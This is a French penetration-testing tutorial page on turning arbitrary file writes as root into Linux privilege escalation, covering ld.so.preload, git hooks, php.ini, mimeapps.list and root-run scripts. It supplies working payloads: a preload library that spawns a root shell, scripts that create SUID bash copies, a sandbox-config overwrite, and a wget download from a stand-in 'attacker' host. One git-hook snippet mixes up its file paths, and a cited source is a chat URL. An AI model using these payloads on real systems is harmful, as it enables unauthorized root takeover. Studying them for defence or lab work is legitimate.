# Écriture arbitraire de fichier en tant que root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ce fichier se comporte comme la variable d'environnement **`LD_PRELOAD`** mais il fonctionne aussi avec les **SUID binaries**.\
Si vous pouvez le créer ou le modifier, vous pouvez simplement ajouter un **chemin vers une bibliothèque qui sera chargée** avec chaque binaire exécuté.

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sont des **scripts** qui sont **exécutés** lors de différents **événements** dans un dépôt git comme lorsqu'un commit est créé, un merge... Donc si un **script ou utilisateur privilégié** réalise ces actions fréquemment et qu'il est possible d'**écrire dans le dossier `.git`**, cela peut être utilisé pour **privesc**.

Par exemple, il est possible de **générer un script** dans un dépôt git dans **`.git/hooks`** pour qu'il soit toujours exécuté lorsqu'un nouveau commit est créé :
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

À faire

### Service & Socket files

À faire

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Certains daemons personnalisés valident le PHP fourni par l'utilisateur en exécutant `php` avec un **`php.ini` restreint** (par exemple, `disable_functions=exec,system,...`). Si le code sandboxé possède encore **un write primitive** (comme `file_put_contents`) et que vous pouvez atteindre le **chemin exact du `php.ini`** utilisé par le daemon, vous pouvez **écraser cette config** pour lever les restrictions, puis soumettre un second payload qui s'exécute avec des privilèges élevés.

Flux typique :

1. Le premier payload écrase la config du sandbox.
2. Le second payload exécute du code maintenant que les fonctions dangereuses sont réactivées.

Exemple minimal (remplacez le chemin utilisé par le daemon) :
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

Le fichier situé dans `/proc/sys/fs/binfmt_misc` indique quel binaire doit exécuter quel type de fichiers. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

Un attaquant disposant de permissions d'écriture sur les répertoires de configuration d'une victime peut facilement remplacer ou créer des fichiers qui modifient le comportement du système, entraînant une exécution de code non désirée. En modifiant le fichier `$HOME/.config/mimeapps.list` pour diriger les handlers d'URL HTTP et HTTPS vers un fichier malveillant (par ex., en définissant `x-scheme-handler/http=evil.desktop`), l'attaquant s'assure que **cliquer sur n'importe quel lien http ou https déclenche le code spécifié dans ce fichier `evil.desktop`**. Par exemple, après avoir placé le code malveillant suivant dans `evil.desktop` dans `$HOME/.local/share/applications`, tout clic sur une URL externe exécute la commande intégrée :
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Pour plus d'infos consultez [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) où il a été utilisé pour exploiter une vulnérabilité réelle.

### Root exécutant des scripts/binaries modifiables par l'utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou n'importe quel binaire situé dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le détourner :

- **Detect the execution:** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) to catch root invoking user-controlled paths:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** s'assurer que le fichier cible et son répertoire appartiennent à votre utilisateur et sont accessibles en écriture par lui.
- **Hijack the target:** sauvegarder le binaire/script original et déposer une payload qui crée un SUID shell (ou toute autre root action), puis restaurer les permissions :
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Déclencher l'action privilégiée** (par ex., en appuyant sur un bouton UI qui lance le helper). Lorsque root réexécute le chemin détourné, récupérer le shell escaladé avec `./rootshell -p`.

## Références

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
